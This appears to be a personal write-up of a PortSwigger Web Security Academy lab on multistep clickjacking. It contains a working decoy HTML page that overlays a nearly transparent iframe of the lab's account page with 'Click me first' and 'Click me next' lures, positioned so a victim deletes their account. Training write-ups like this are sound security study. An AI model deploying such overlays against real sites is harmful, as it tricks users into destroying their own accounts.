# [Multistep clickjacking] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-06
 
---
 
## Vulnerability / core concept
Clickjacking

---


## Payload / key command
This web application has delete account feature that requires confirmation to avoid clickjacking. To execute clickjacking, we need to construct a decoy web page that will click me first button on the `delete` button and then make them press next button on `yes` confirmation to confirm the deletion. I used the following decoy page for this purpose:
```html
<style>
	iframe {
		position:relative;
		width: 1000px;
		height: 900px;
		opacity: 0.1;
		z-index: 2;
	}
	.first {
		position:absolute;
		top: 517px;
		left: 55px;
		z-index: 1;
	}
        .second {
		position:absolute;
		top: 310px;
		left: 200px;
		z-index: 1;
	}
</style>
<div class="first">Click me first</div>
<div class="second">Click me next</div>
<iframe src="https://0a1200c6047593a280fdad4d005f00cf.web-security-academy.net/my-account"></iframe>
```
Here, user clicks `Click me first` and then clicks `Click me next` buttons therefore confirming the deletion of account.


